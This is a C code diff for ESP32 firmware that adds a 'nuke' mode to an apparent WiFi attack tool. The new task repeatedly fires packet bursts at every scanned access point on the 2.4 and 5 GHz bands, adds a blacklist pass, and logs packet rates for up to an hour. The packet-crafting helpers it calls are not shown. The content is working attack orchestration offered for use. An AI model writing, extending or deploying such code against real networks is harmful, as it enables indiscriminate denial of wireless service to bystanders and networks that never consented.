@@ -16,6 +16,7 @@
 
 static volatile bool s_running = false;
 static TaskHandle_t  s_task = NULL;
+static bool          s_is_nuke = false;
 
 static uint32_t s_duration = 0;
 static uint32_t s_started_us = 0;
@@ -215,10 +216,80 @@ static void attack_task(void *arg)
     vTaskDelete(NULL);
 }
 
+static void attack_nuke_task(void *arg)
+{
+    (void)arg;
+    s_started_us = (uint32_t)(esp_timer_get_time() / 1000000ULL);
+    s_pkts_24 = s_pkts_5 = s_pkts_bl = 0;
+
+    int n = targets_ap_count();
+    io_log("attack: start mode=nuke duration=%us  aps=%d\r\n",
+           (unsigned)s_duration, n);
+
+    uint32_t last_log = 0;
+
+    while (s_running) {
+        uint32_t elapsed = now_sec() - s_started_us;
+        if (elapsed >= s_duration) break;
+
+        n = targets_ap_count();
+        for (int i = 0; i < n && s_running; i++) {
+            target_ap_t ap;
+            if (targets_get_ap(i, &ap) != 0) continue;
+            uint32_t sent = attack_burst_for_ap(&ap, ATTACK_MODE_MIXED);
+            if (ap.band_5ghz) s_pkts_5  += sent;
+            else              s_pkts_24 += sent;
+            vTaskDelay(pdMS_TO_TICKS(3));
+        }
+
+        s_pkts_bl += blacklist_pass();
+        vTaskDelay(pdMS_TO_TICKS(2));
+
+        elapsed = now_sec() - s_started_us;
+        if (elapsed - last_log >= 2) {
+            last_log = elapsed;
+            uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
+            io_log("nuke: %us  aps=%d  pkts=%" PRIu32 "  pps=%.0f\r\n",
+                   (unsigned)elapsed, n, total,
+                   (float)total / (float)(elapsed > 0 ? elapsed : 1));
+        }
+    }
+
+    uint32_t total_time = now_sec() - s_started_us;
+    uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
+    io_log("attack: stopped after %us  total=%" PRIu32 "  avg_pps=%.0f\r\n",
+           (unsigned)total_time, total,
+           (float)total / (float)(total_time > 0 ? total_time : 1));
+
+    s_running = false;
+    s_is_nuke = false;
+    s_task = NULL;
+    vTaskDelete(NULL);
+}
+
 void attack_init(void)
 {
     s_running = false;
+    s_is_nuke = false;
     s_task = NULL;
+}
+
+bool attack_nuke_start(uint32_t duration_seconds)
+{
+    if (s_running) { io_log("attack: already running\r\n"); return false; }
+    if (targets_ap_count() == 0) { io_log("nuke: no APs — run scan first\r\n"); return false; }
+    if (duration_seconds < 1) duration_seconds = 1;
+    if (duration_seconds > 3600) duration_seconds = 3600;
+    s_duration = duration_seconds;
+    s_is_nuke = true;
+    s_running = true;
+    if (xTaskCreate(attack_nuke_task, "nuke", 8192, NULL, 3, &s_task) != pdPASS) {
+        s_running = false;
+        s_is_nuke = false;
+        io_log("nuke: task create failed\r\n");
+        return false;
+    }
+    return true;
 }
 
 bool attack_start(uint32_t duration_seconds)
@@ -266,8 +337,8 @@ void attack_print_status(void)
     uint32_t remain = (elapsed >= s_duration) ? 0 : (s_duration - elapsed);
     uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
     float pps = (float)total / (float)(elapsed > 0 ? elapsed : 1);
+    const char *mname = s_is_nuke ? "nuke" : targets_mode_name(targets_get_mode());
     io_log("status: running  mode=%s  elapsed=%us  remain=%us  pkts=%" PRIu32 "  pps=%.0f  (24=%" PRIu32 " 5=%" PRIu32 " bl=%" PRIu32 ")\r\n",
-           targets_mode_name(targets_get_mode()),
-           (unsigned)elapsed, (unsigned)remain, total, pps,
+           mname, (unsigned)elapsed, (unsigned)remain, total, pps,
            s_pkts_24, s_pkts_5, s_pkts_bl);
 }
